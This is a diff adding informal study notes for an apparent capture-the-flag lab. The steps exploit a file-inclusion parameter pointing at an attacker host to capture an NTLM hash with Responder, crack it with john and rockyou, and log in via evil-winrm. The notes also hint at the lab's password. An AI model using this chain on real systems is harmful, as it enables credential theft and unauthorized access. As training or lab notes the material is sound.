@@ -1,0 +1,40 @@
+responder
+|
+|
+-visit ip address in firefox
+|
+- add "ip address redirect url" to /etc/hosts
+|
+-use firefox extension wappanalyser to find what the site is built on
+|
+-ntlm new technology lan manager(read up on this)
+|
+-use responder to exploit ntlm
+|
+- two types of file inclusion(i.e acessing file) external and internal internal uses shid liek /../ 
+-external uses //host/filename using smb to get file from external source
+|
+-working of nltm in brief:
+
+The client sends a username to the host.
+The host responds with a random number (i.e. the challenge).
+The client then generates a hashed password value from this number and the user’s password, and then sends this back as a response.
+The host knows the user’s password and generates a hashed password value which it can then compare to the client’s response.
+If both values match, the authenticity of the client is confirmed, and network access is granted. If there is no match between the values, the client will be denied access.
+|
+|
+-put page=//yer linux vm ip address/ so it giev you the hash
+|
+-hash will be liek random numbers and shid
+|
+-save the hash to a file with .txt or .hash extension
+|
+-use john liek john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
+|
+-use anything but it should have password badminton in it else lmao no password
+|
+-and dont leave space between --wordlist= and wordlist path liek above
+|
+-use evil-winrm to login use -i not --url for the host ip address
+|
+-flag will be in c:/users/mike/desktop but you will be logged in as Administrator so change path
